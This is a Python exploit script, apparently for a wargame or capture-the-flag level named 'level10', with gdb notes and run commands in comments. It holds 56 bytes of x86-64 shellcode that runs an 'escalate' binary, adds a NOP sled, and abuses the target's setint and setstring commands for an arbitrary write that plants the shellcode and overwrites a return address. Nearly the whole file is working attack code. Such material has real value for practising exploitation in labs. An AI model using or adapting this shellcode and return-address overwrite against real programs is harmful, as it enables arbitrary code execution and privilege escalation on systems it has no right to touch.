import struct, sys

# Your shellcode (56 bytes)
raw_shellcode = b"\x48\x83\xc4\x80\x48\x31\xd2\x52\x48\xbb\x65\x73\x63\x61\x6c\x61\x74\x65\x53\x48\xbb\x61\x6c\x2f\x62\x69\x6e\x2f\x2f\x53\x48\xbb\x2f\x75\x73\x72\x2f\x6c\x6f\x63\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"

if len(sys.argv) != 3:
    raise ValueError("Please provide the following command line arguments: <return_address> <slot_1_address>")

# 1. Allocate shell code slot to string --> "allocate 1 3"
# 2. Fill the slot with shell code (56 bytes) --> "setstring 1 {shellcode}"
# 3. Allocate slot for buffer overflow to string --> "allocate 2 3"
# 4. Fill the slot with the return address from set_string (rbp+0x08) --> "setint 2 0x7fffffffe168" 
# 5. Fill the slot as a string with the address of slot 1 (+ 4 bytes) --> "setstring 2 0x55555555a740"
# 6. Print slot 2 --> "print 2"

# Whole thing --> "allocate 1 3\nsetstring 1 {shellcode}\nallocate 2 3\nsetint 2 0x7fffffffe168\nsetstring 2 0x555555558044\nprint 2"

return_address_address = int(sys.argv[1], 16)
shellcode_address = int(sys.argv[2], 16) # this should be some address on the stack that has space for the 56 bytes

nop_sled = b"\x90" * (60) 

raw_shellcode = nop_sled + raw_shellcode
# inject the address of the return address as location of the first slot to then overwrite the return address with setstring
allocate_0 = b"allocate 0 3\n"
fix_0_location_size_to_shellcode_length = b"setstring 0 " + raw_shellcode + b"\n" # CAUTION: if you add a nop-sled, make this longer
inject_shellcode_address = b"setint 0 " + f"{str(shellcode_address)}".encode() + b"\n" # next setstring will write to that address
inject_shellcode_onto_stack = b"setstring 0 " + raw_shellcode + b"\n" # write shellcode onto stack address (stack is executable)


string_injectable_shellcode_address = shellcode_address.to_bytes(8, byteorder='little') # convert the shellcode address to bytes to inject as string
print(f"injecting: ", string_injectable_shellcode_address.hex())
# string_injectable_shellcode_address.rstrip(b"\x00")
# print(f"length: ", len(string_injectable_shellcode_address))
# string_injectable_shellcode_address += (8 - len(string_injectable_shellcode_address)) * b"A"


allocate_1 = b"allocate 1 3\n"
fix_1_location_size_to_shellcode_address_length = b"setstring 1 " + string_injectable_shellcode_address + b"\n"
inject_return_address_address = b"setint 1 " + f"{str(return_address_address)}".encode() + b"\n" # next setstring will  overwrite the return address
overwrite_return_address = b"setstring 1 " + string_injectable_shellcode_address + b"\n" # write the address of the shellcode onto the return address so that when the function returns, it jumps to our shellcode

output =  allocate_0 + fix_0_location_size_to_shellcode_length + inject_shellcode_address + inject_shellcode_onto_stack + allocate_1 + fix_1_location_size_to_shellcode_address_length + inject_return_address_address + overwrite_return_address

sys.stdout.buffer.write(output)


# rbp: 0x7fffffffe250 or 0x7fffffffe1a0
# return address's address: 0x7fffffffe258 or 0x7fffffffe1a8

# rbp in set_string: 0x7fffffffe1d0 (actually with precise gdb debuggin: 0x7fffffffe1a0 )
# return address in set_string: 0x7fffffffe1d8 ("" 0x7fffffffe1a8)

# rbp in handle_setstring: 0x7fffffffe1d0
# return address in handle_setstring: 0x7fffffffe1d8

# random instruction address in handle_setstring: 0x0000555555555613
# random instruction in set_string: 0x00005555555552fe

# array start: 0x0000555555558040
# shellcode address (its the + 4 bytes from  of array start): 0x0000555555558044 (+ 4 bytes as the first 4 bytes are the type of slot 1)

# stack start_address: 0x7ffffffde000 

# r <<< $(python3 ~/level10.py 0x7fffffffe258 0x0000555555558044)
# r <<< $(python3 ~/level10.py 0x7fffffffe1d8 0x0000555555558044)
# r <<< $(python3 ~/level10.py 0x7fffffffe1a8 0x7ffffffde008)

# some instruction address in set_string: 0x0000555555555347

# allocate 0 3 
# setstring 0 H�ĀH1�RH�escalateSH�al/bin//SH�/usr/locSH��RWH��H1��;
# allocate 1 3
# setstring 1 AAAAAAAA
# setint 1 140737488347560

# setstring 1 @UUUAAAA

# gdb: python3 ~/level10.py 0x7fffffffe1a8 0x7ffffffde008 | ./level10
# outside: python3 ~/level10.py 0x7fffffffe1b8 0x7ffffffde008 | ./level10
# or python3 ~/level10.py 0x7fffffffe1c8 0x7ffffffde008 | /levels/level10/level10
